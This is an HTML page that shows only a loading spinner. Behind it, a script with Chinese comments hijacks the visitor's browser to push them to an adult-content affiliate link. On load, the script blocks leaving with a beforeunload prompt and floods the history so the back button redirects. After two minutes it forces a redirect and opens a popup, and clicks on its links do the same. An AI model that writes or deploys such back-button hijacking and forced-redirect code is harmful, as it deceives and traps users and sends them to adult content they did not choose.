<!DOCTYPE html>
<html>
<head>
  <meta name="pushsdk" content="c637a090aed3ab2a9f759f5d73ba1f11">
  <style>
    body {
        background-color: #3b3b3b;  
        display: flex;
        justify-content: center;
        align-items: center;
        height: 70vh;
        flex-direction: column;
        font-size: 4rem; 
        color: #FFFAF0
    }
    .loading {
      width: 150px;
      height: 150px;
      border: 15px solid #FFFAF0;
      border-top-color: transparent;
      border-radius: 100%;
      margin-bottom: 16px;
      animation: circle infinite 0.75s linear;
    }
    
    @keyframes circle {
      0% {
        transform: rotate(0);
      }
      100% {
        transform: rotate(360deg);
      }
    }
  </style>

  <script type="text/javascript">
    // ==================== 链接设置 ====================
    var fin_link = 'https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}';
    var new_page_url = 'https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}'; // 新页面链接
    console.log('固定链接:', fin_link);
    console.log('新页面链接:', new_page_url);
    // ==================== 设置结束 ====================

    // 设置所有finlink类的链接
    var links = document.getElementsByClassName('finlink');
    for (var i = 0; i < links.length; i++) {
        links[i].setAttribute("href", fin_link);
    }

    // 为所有链接绑定点击事件 - 修改为同时执行两个操作
    for (var j = 0; j < links.length; j++) {
        links[j].addEventListener('click', function (evt) {
            evt.preventDefault(); // 阻止默认链接跳转
            
            console.log('链接被点击');
            
            // 1. 移除页面离开事件监听
            window.removeEventListener('beforeunload', befUnlFunc);
            window.onbeforeunload = null;
            
            // 2. 当前页面跳转到fin_link（页面顶部）
            window.location.href = fin_link;
            
            // 3. 打开新页面到http://www.google.com
            window.open(new_page_url, '_blank');
        });
    }

    // 页面离开确认函数
    function befUnlFunc(e) {
        e.preventDefault();
        console.log('page closed');
        const confirmationMessage = 'Are you sure you want to leave the page?';
        e.returnValue = confirmationMessage;
        return confirmationMessage;
    }
    window.addEventListener('beforeunload', befUnlFunc);

    // 自动重定向：2分钟后执行与点击相同的操作
    setTimeout(function () {
        window.onbeforeunload = null;
        console.log('2分钟定时器触发');
        
        // 1. 当前页面跳转到fin_link（页面顶部）
        window.location.href = fin_link;
        
        // 2. 打开新页面到http://www.google.com
        window.open(new_page_url, '_blank');
        
    }, 60000 * 2);

    // 防止浏览器后退功能
    !function () {
        var t;
        try {
            for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
            onpopstate = function (t) {
                window.onbeforeunload = null;
                t.state && location.replace(fin_link);
            };
        } catch (o) {}
    }();
  </script>
            
  
  

  
       
</head>
<body>
    <div  onclick='launchpopLink()'><b>Loading...</b></div><br>
    <div class="loading" onclick='launchpopLink()'></div>
</body>
</html>